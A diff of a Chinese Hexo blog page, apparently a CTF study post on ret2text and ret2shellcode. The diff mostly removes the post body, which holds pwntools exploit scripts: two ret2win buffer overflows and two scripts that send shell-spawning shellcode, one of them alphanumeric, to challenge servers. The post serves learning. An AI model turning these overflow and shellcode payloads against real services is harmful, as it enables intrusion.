@@ -21,7 +21,7 @@
 <meta name="twitter:card" content="summary">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css?v=233" crossorigin>
   
-  <link rel="stylesheet" href="/css/style.css?v=1601037195223">
+  <link rel="stylesheet" href="/css/style.css?v=1601037427436">
 <meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -151,87 +151,13 @@
 
         <div class="nexmoe-post-meta nexmoe-rainbow">
             <a><i class="nexmoefont icon-calendar-fill"></i>2020年09月25日</a>
-            <a><i class="nexmoefont icon-areachart"></i>420 字</a>
+            <a><i class="nexmoefont icon-areachart"></i>421 字</a>
             <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
         </div>
 
         <article>
             
-                <a id="more"></a>
-
-<h2 id="有关ret2text和retshellcode的分享"><a href="#有关ret2text和retshellcode的分享" class="headerlink" title="有关ret2text和retshellcode的分享"></a>有关ret2text和retshellcode的分享</h2><p><a target="_blank" rel="noopener" href="http://ctf.taqini.space/challenges">http://ctf.taqini.space/challenges</a></p>
-<h3 id="例题1：ret2win32"><a href="#例题1：ret2win32" class="headerlink" title="例题1：ret2win32"></a>例题1：ret2win32</h3><p>1.查看保护机制</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353rfbgmj31dg098abr.jpg" alt="image-20200722135043029" class="lazyload"></p>
-<p>2.ida分析</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353wa6eij31k80by76q.jpg" alt="屏幕快照 2020-07-22 13.52.49" class="lazyload"></p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353sjqvnj31ly0cu420.jpg" alt="屏幕快照 2020-07-22 13.52.35" class="lazyload"></p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353wrfivj31ks0l8dlp.jpg" alt="屏幕快照 2020-07-22 13.52.08" class="lazyload"></p>
-<p>3.exp</p>
-<pre><code class="python">from pwn import *
-#p = process(&#39;./ret2win32&#39;)
-p = remote(&#39;ctf.taqini.space&#39;,28077)
-
-ret2win = 0x8048672
-offset = 44
-payload = &#39;A&#39;*offset
-payload += p64(ret2win)
-p.sendline(payload)
-
-p.interactive() </code></pre>
-<h3 id="例题2：ret2win"><a href="#例题2：ret2win" class="headerlink" title="例题2：ret2win"></a>例题2：ret2win</h3><p>1.查看保护机制</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353ucue8j31hs092jt7.jpg" alt="image-20200722140314868" class="lazyload"></p>
-<p>2.ida分析</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353uwshmj31em0ayacn.jpg" alt="image-20200722140501893" class="lazyload"></p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353rlfflj31jm0cs41y.jpg" alt="image-20200722140548435" class="lazyload"></p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353x7un9j31ko0gawkc.jpg" alt="image-20200722140717277" class="lazyload"></p>
-<p>3.exp</p>
-<pre><code class="python">from pwn import *
-#p = process(&#39;./ret2win&#39;)
-p = remote(&#39;ctf.taqini.space&#39;,28027)
-
-ret2win = 0x400824
-offset = 32+8
-payload = &#39;A&#39;*offset
-payload += p64(ret2win)
-p.sendline(payload)
-
-p.interactive() </code></pre>
-<h3 id="补充：开启PIE保护后的利用"><a href="#补充：开启PIE保护后的利用" class="headerlink" title="补充：开启PIE保护后的利用"></a>补充：开启PIE保护后的利用</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177520">https://www.anquanke.com/post/id/177520</a></p>
-<p>PIE全称是position-independent  executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址。</p>
-<p>不开启PIE保护的时候每次运行时加载地址不变</p>
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/04/30/EGusk4.png"><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353tgzusj30p50mvgsg.jpg" alt="img" class="lazyload"></a></p>
-<p>开启PIE保护的时候每次运行时加载地址是随机变化的</p>
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/04/30/EGu40O.png"><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353veft0j30p50mvgsg.jpg" alt="img" class="lazyload"></a></p>
-<p>可以看出，如果一个程序开启了PIE保护的话，对于我们的利用会造成很大影响</p>
-<h3 id="例题3-mrctf2020-shellcode"><a href="#例题3-mrctf2020-shellcode" class="headerlink" title="例题3:mrctf2020_shellcode"></a>例题3:mrctf2020_shellcode</h3><p><a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p>
-<p>1.查看保护机制</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353sya4gj31po0aemzb.jpg" alt="image-20200722143551919" class="lazyload"></p>
-<p>2.ida分析</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353s2h6ej31d20ewad6.jpg" alt="image-20200722144204159" class="lazyload"></p>
-<p>3.exp</p>
-<pre><code class="python">from pwn import *
-context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
-#p=process(&#39;./mrctf2020_shellcode&#39;)
-p=remote(&#39;node3.buuoj.cn&#39;,29850)
-payload = asm(shellcode = shellcraft.amd64.linux.sh())
-p.recvuntil(&#39;Show me your magic!&#39;)
-p.send(payload)
-p.interactive()</code></pre>
-<h3 id="例题4-mrctf2020-shellcode-revenge"><a href="#例题4-mrctf2020-shellcode-revenge" class="headerlink" title="例题4:mrctf2020_shellcode_revenge"></a>例题4:mrctf2020_shellcode_revenge</h3><p><a target="_blank" rel="noopener" href="http://taqini.space/2020/03/31/alpha-shellcode-gen/">http://taqini.space/2020/03/31/alpha-shellcode-gen/</a></p>
-<p>1.查看保护机制</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353vtc9nj31sa0ag76i.jpg" alt="image-20200722144940583" class="lazyload"></p>
-<p>2.ida分析</p>
-<p><img data-sizes="auto" data-src="https://tva1.sinaimg.cn/large/007S8ZIlly1gj353tw1vcj31sa0kon1q.jpg" alt="image-20200722145023272" class="lazyload"></p>
-<p>3.exp</p>
-<pre><code class="python">from pwn import *
-context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
-#p=process(&#39;./mrctf2020_shellcode&#39;)
-p=remote(&#39;node3.buuoj.cn&#39;,28450)
-payload = &quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;
-p.recvuntil(&#39;Show me your magic!&#39;)
-p.send(payload)
-p.interactive()</code></pre>
-
+                <h2 id="有关ret2text和retshellcode的分享"><a href="#有关ret2text和retshellcode的分享" class="headerlink" title="有关ret2text和retshellcode的分享"></a>有关ret2text和retshellcode的分享</h2>
             
         </article>
     </div>
@@ -270,7 +196,7 @@ p.interactive()</code></pre>
     <script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
 
 
-<script src="/js/app.js?v=1601037195224"></script>
+<script src="/js/app.js?v=1601037427437"></script>
   
 
 
